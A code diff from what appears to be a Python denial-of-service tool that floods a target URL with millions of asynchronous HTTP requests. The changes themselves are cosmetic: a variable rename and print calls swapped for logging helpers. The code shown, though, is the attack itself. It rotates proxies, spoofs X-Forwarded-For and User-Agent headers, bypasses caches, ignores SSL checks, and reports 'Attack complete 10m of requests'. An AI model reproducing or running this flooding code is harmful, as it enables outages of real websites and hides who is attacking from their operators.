@@ -184,16 +184,16 @@ async def Yokai(session):
     async def _call(i):
         try:
             url = url + Functions.Cache()
-            yokai = choice(Options.yokais)
+            kai = choice(Options.yokais)
             header.update({
                 "User-Agent": choice(Options.ua),
-                "X-Forwarded-For": yokai,
+                "X-Forwarded-For": kai,
             })
-            server = "{}://{}".format(Options.v_type, yokai)
+            server = "{}://{}".format(Options.v_type, kai)
             async with session.get(url=url, allow_redirects=False, ssl=False, proxy=server, headers=header) as response:
                 sem.release()
                 if i % 1000 == 0:
-                    print("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
+                    Functions.Success("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
         except ClientProxyConnectionError:
             Functions.Error("Proxy server connection reject.")
         except ClientConnectorError:
@@ -208,8 +208,7 @@ async def Yokai(session):
         tasks.append(task)
 
     await wait(tasks)
-    print("Attack complete 10m of requests")
-
+    Functions.Success("Attack complete 10m of requests")
 
 async def Direct(session):
     url = Options.url
@@ -235,7 +234,7 @@ async def Direct(session):
             async with session.get(url=url, allow_redirects=False, ssl=False, headers=header) as response:
                 sem.release()
                 if i % 1000 == 0:
-                    print("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
+                    Functions.Success("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
         except ClientConnectorError:
             Functions.Error("Fail to connect to target.")
 
@@ -246,7 +245,7 @@ async def Direct(session):
         tasks.append(task)
 
     await wait(tasks)
-    print("Attack complete 10m of requests")
+    Functions.Success("Attack complete 10m of requests")
 
 
 async def Attack():
